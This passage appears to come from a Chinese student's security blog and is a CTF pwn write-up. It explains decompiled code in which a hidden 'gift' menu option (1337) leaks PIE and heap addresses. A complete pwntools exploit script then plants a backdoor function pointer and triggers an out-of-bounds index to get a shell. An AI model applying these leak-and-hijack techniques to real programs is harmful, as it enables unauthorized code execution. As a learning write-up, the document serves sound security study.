&amp;0xFFFFFFFFFFFFF000LL是干了啥呢? 与之后就是程序0x5000的位置,是为了得到这个位置,然后+0x29C0就是存储gift的地方
​		不过这里为啥是0xDEADBF61LL,这是什么逻辑,后面在main中要+0xDEADBEEFLL,
​		所以0x1278 - 0xDEADBF61 +0xDEADBEEF &#x3D; 0x1206,就是gift的地址,所以这个地址应该是这个原因,因为要考虑到pie,所以要用一个函数或者变量的地址,这里用了0x1278的, 和它差多少呢?  就是  0x1206  -  0xDEADBEEF-0x1278,也就是-0xdeadbf61
12345678910111213141516.init_array:0000000000003D60                 ;org 3D60h.init_array:0000000000003D60 off_3D60        dq offset sub_11C0      ; DATA XREF: LOAD:0000000000000168↑o.init_array:0000000000003D60                                         ; LOAD:00000000000002F0↑o.init_array:0000000000003D68                 dq offset sub_144E.init_array:0000000000003D68 _init_array     ends.init_array:0000000000003D68    unsigned __int64 sub_144E()&#123;  unsigned __int64 v1; // [rsp+8h] [rbp-8h]  v1 = __readfsqword(0x28u);  *(_QWORD *)(((unsigned __int64)&amp;unk_5018 &amp; 0xFFFFFFFFFFFFF000LL) + 0x29C0) = (char *)sub_1278 - 0xDEADBF61LL;  return v1 - __readfsqword(0x28u);&#125;

​		所以就可以先通过调用gift来进行泄露地址,0x29C0 &#x3D; 10688 , 10688&#x2F;8 &#x3D; 1336,这是因为指针的偏移,按照char类型来算????? 是吗?
​	因为在main中还有个-1,所以是1337,输入1337就可以调用gift了!
最终步骤123choice: 1337Ok, you find the gift0x5557ed770206, 0x7f1094c79d80, 0x5557eea752a0

​		之前取这些数据的时候老出问题…….
​		先把前面的数据接收了,然后再接收三个值,怎么接收呢,可以按照长度来,但是感觉比较der,还是看老曹的..recvline之后strip去掉最后的空格,然后decode解码,然后通过”, “分割,这样gift就成了数组, 0 1 2 对应着三个值,就可以了!
123456gift = (p.recvline().strip()).decode().split(&#x27;, &#x27;)pie = int(gift[0], 16) - 0x1206#print(hex(pie))leak_heap_addr = int(gift[2], 16)#print(hex(leak_heap_addr))vul_addr = leak_heap_addr + 0x20

​		然后把后门地址写入堆地址,此时也有堆的地址了,再次利用main函数中的调用逻辑,调用就可以了
123456789backdoor_addr = pie + 0x11c9p.recvuntil(&#x27;choice: &#x27;)p.sendline(&#x27;1&#x27;)p.recvuntil(&#x27;content: &#x27;)p.send(p64(backdoor_addr - 0xdeadbeef))trigger_input = (vul_addr - pie - 0x5000) // 8 + 1

​		&#x2F;&#x2F;是整除的意思
exp123456789101112131415161718192021222324252627282930313233343536from pwn import *elf = &quot;./pwn&quot;context.log_level= &quot;debug&quot;p = process(elf)p =remote(&quot;xxxxx&quot;, xxx)context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#gdb.attach(p)p.sendlineafter(&#x27;choice: &#x27;, str(1337))p.recvuntil(&#x27;Ok, you find the gift\n&#x27;)gift = (p.recvline().strip()).decode().split(&#x27;, &#x27;)pie = int(gift[0], 16) - 0x1206#print(hex(pie))leak_heap_addr = int(gift[2], 16)#print(hex(leak_heap_addr))vul_addr = leak_heap_addr + 0x20backdoor_addr = pie + 0x11c9p.recvuntil(&#x27;choice: &#x27;)p.sendline(&#x27;1&#x27;)p.recvuntil(&#x27;content: &#x27;)p.send(p64(backdoor_addr - 0xdeadbeef))trigger_input = (vul_addr - pie - 0x5000) // 8 + 1p.recvuntil(&#x27;choice: &#x27;)p.sendline(str(trigger_input))p.interactive()



待解决这个题如果正向写代码,要怎么写呢?
ida一开始进去不是main而是…这里是否…
</div></div></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/page/3/#content-inner"><i class="fas fa-chevron-left fa-fw"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/#content-inner">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/#content-inner">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/#content-inner">9</a><a class="extend next" rel="next" href="/page/5/#content-inner"><i class="fas fa-chevron-right fa-fw"></i></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/profile.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">唐仔橙</div><div class="author-info__description">喜欢探索世界,在读研究生,计算机爱好者的成长记录</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">88</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">15</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/tangzichengcc"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/tangzichengcc" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">会记录自己的学习经历,以及一些经历,如果有想法或者疑惑,欢迎交流!!</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/pwn%E5%85%A5%E9%97%A8-55-iofile%E5%85%A5%E9%97%A8%E4%B9%8Bvtable%E5%8A%AB%E6%8C%81/" title="pwn入门-55-iofile入门之vtable劫持"><img src="/img/background/10.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwn入门-55-iofile入门之vtable劫持"/></a><div class="content"><a class="title" href="/pwn%E5%85%A5%E9%97%A8-55-iofile%E5%85%A5%E9%97%A8%E4%B9%8Bvtable%E5%8A%AB%E6%8C%81/" title="pwn入门-55-iofile入门之vtable劫持">pwn入门-55-iofile入门之vtable劫持</a><time datetime="2024-02-11T08:43:00.000Z" title="发表于 2024-02-11 16:43:00">2024-02-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/pwn%E5%85%A5%E9%97%A8-54-exit-hook%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/" title="pwn入门-54-exit_hook函数利用"><img src="/img/background/2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwn入门-54-exit_hook函数利用"/></a><div class="content"><a class="title" href="/pwn%E5%85%A5%E9%97%A8-54-exit-hook%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/" title="pwn入门-54-exit_hook函数利用">pwn入门-54-exit_hook函数利用</a><time datetime="2024-02-11T08:01:29.000Z" title="发表于 2024-02-11 16:01:29">2024-02-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/pwn%E5%85%A5%E9%97%A8-53-glibc%E4%B9%8Bmalloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" title="pwn入门-53-glibc之malloc源码分析"><img src="/img/background/16.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwn入门-53-glibc之malloc源码分析"/></a><div class="content"><a class="title" href="/pwn%E5%85%A5%E9%97%A8-53-glibc%E4%B9%8Bmalloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" title="pwn入门-53-glibc之malloc源码分析">pwn入门-53-glibc之malloc源码分析</a><time datetime="2024-02-11T05:40:56.000Z" title="发表于 2024-02-11 13:40:56">2024-02-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/pwn%E5%85%A5%E9%97%A8-52-iofile%E7%BB%93%E5%90%88%E7%89%B9%E6%AE%8Agadget%E8%BF%9B%E8%A1%8Crop/" title="pwn入门-52-iofile结合特殊gadget进行rop"><img src="/img/background/14.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwn入门-52-iofile结合特殊gadget进行rop"/></a><div class="content"><a class="title" href="/pwn%E5%85%A5%E9%97%A8-52-iofile%E7%BB%93%E5%90%88%E7%89%B9%E6%AE%8Agadget%E8%BF%9B%E8%A1%8Crop/" title="pwn入门-52-iofile结合特殊gadget进行rop">pwn入门-52-iofile结合特殊gadget进行rop</a><time datetime="2024-02-10T12:22:28.000Z" title="发表于 2024-02-10 20:22:28">2024-02-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/pwn%E5%85%A5%E9%97%A8-51-IO-obstack-jumps%E5%88%A9%E7%94%A8/" title="pwn入门-51-_IO_obstack_jumps利用"><img src="/img/background/3.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwn入门-51-_IO_obstack_jumps利用"/></a><div class="content"><a class="title" href="/pwn%E5%85%A5%E9%97%A8-51-IO-obstack-jumps%E5%88%A9%E7%94%A8/" title="pwn入门-51-_IO_obstack_jumps利用">pwn入门-51-_IO_obstack_jumps利用</a><time datetime="2024-02-10T12:21:41.000Z" title="发表于 2024-02-10 20:21:41">2024-02-10</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
            <i class="fas fa-folder-open"></i>
            <span>分类</span>
            <a class="card-more-btn" href="/categories/" title="查看更多">
    <i class="fas fa-angle-right"></i></a>
            </div>
            <ul class="card-category-list" id="aside-cat-list">
            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/FUZZ/"><span class="card-category-list-name">FUZZ</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/IOT/"><span class="card-category-list-name">IOT</span><span class="card-category-list-count">3</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/PWN/"><span class="card-category-list-name">PWN</span><span class="card-category-list-count">53</span></a><ul class="card-category-list child"><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/PWN/%E8%99%9A%E6%8B%9F%E5%8C%96/"><span class="card-category-list-name">虚拟化</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/PWN/%E8%B0%83%E8%AF%95/"><span class="card-category-list-name">调试</span><span class="card-category-list-count">1</span></a></li></ul></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><span class="card-category-list-name">漏洞复现</span><span class="card-category-list-count">2</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E7%94%9F%E6%B4%BB/"><span class="card-category-list-name">生活</span><span class="card-category-list-count">2</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E7%A7%91%E7%A0%94-%E5%B9%B6%E6%B2%A1%E6%9C%89/"><span class="card-category-list-name">科研(并没有)</span><span class="card-category-list-count">1</span></a></li>
            </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/%E6%97%85%E6%B8%B8/" style="font-size: 1.15em; color: rgb(95, 31, 72)">旅游</a><a href="/tags/%E8%B7%AF%E7%94%B1%E5%99%A8/" style="font-size: 1.3em; color: rgb(67, 198, 167)">路由器</a><a href="/tags/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8/" style="font-size: 1.15em; color: rgb(173, 133, 0)">浏览器安全</a><a href="/tags/C%E8%AF%AD%E8%A8%80/" style="font-size: 1.3em; color: rgb(123, 19, 74)">C语言</a><a href="/tags/csapp/" style="font-size: 1.15em; color: rgb(124, 165, 51)">csapp</a><a href="/tags/PWN%E5%85%A5%E9%97%A8/" style="font-size: 1.45em; color: rgb(26, 101, 95)">PWN入门</a><a href="/tags/%E5%A0%86/" style="font-size: 1.15em; color: rgb(1, 70, 150)">堆</a><a href="/tags/%E8%84%9A%E6%9C%AC/" style="font-size: 1.15em; color: rgb(113, 102, 86)">脚本</a><a href="/tags/docker/" style="font-size: 1.15em; color: rgb(190, 55, 61)">docker</a><a href="/tags/%E7%A0%94%E7%A9%B6%E7%94%9F%E8%AF%BE%E7%A8%8B/" style="font-size: 1.38em; color: rgb(48, 195, 77)">研究生课程</a><a href="/tags/%E8%AF%97%E6%AD%8C/" style="font-size: 1.15em; color: rgb(17, 127, 6)">诗歌</a><a href="/tags/%E8%AE%BA%E6%96%87/" style="font-size: 1.15em; color: rgb(163, 148, 145)">论文</a><a href="/tags/%E8%B0%83%E8%AF%95/" style="font-size: 1.15em; color: rgb(44, 145, 15)">调试</a><a href="/tags/KVM/" style="font-size: 1.22em; color: rgb(71, 80, 167)">KVM</a><a href="/tags/USENIX/" style="font-size: 1.15em; color: rgb(145, 60, 198)">USENIX</a></div></div><div class="card-widget card-archives"><div class="item-headline"><i class="fas fa-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="fas fa-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><span class="card-archive-list-count">6</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><span class="card-archive-list-count">2</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/11/"><span class="card-archive-list-date">十一月 2023</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/10/"><span class="card-archive-list-date">十月 2023</span><span class="card-archive-list-count">6</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/09/"><span class="card-archive-list-date">九月 2023</span><span class="card-archive-list-count">7</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/08/"><span class="card-archive-list-date">八月 2023</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/07/"><span class="card-archive-list-date">七月 2023</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/06/"><span class="card-archive-list-date">六月 2023</span><span class="card-archive-list-count">8</span></a></li></ul></div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站资讯</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">88</div></div><div class="webinfo-item"><div class="item-name">已运行时间 :</div><div class="item-count" id="runtimeshow" data-publishDate="2022-10-02T16:00:00.000Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总访问量 :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2024-02-18T15:57:21.380Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2024 By 唐仔橙</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function subtitleType () {
  if (true) { 
    window.typed = new Typed("#subtitle", {
      strings: ["应知学问难，在乎点滴勤。尤其难上难，锻炼品德纯。","勤能补拙,天道酬勤"],
      startDelay: 300,
      typeSpeed: 150,
      loop: true,
      backSpeed: 50
    })
  } else {
    document.getElementById("subtitle").innerHTML = '应知学问难，在乎点滴勤。尤其难上难，锻炼品德纯。'
  }
}

if (true) {
  if (typeof Typed === 'function') {
    subtitleType()
  } else {
    getScript('https://cdn.jsdelivr.net/npm/typed.js/lib/typed.min.js').then(subtitleType)
  }
} else {
  subtitleType()
}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>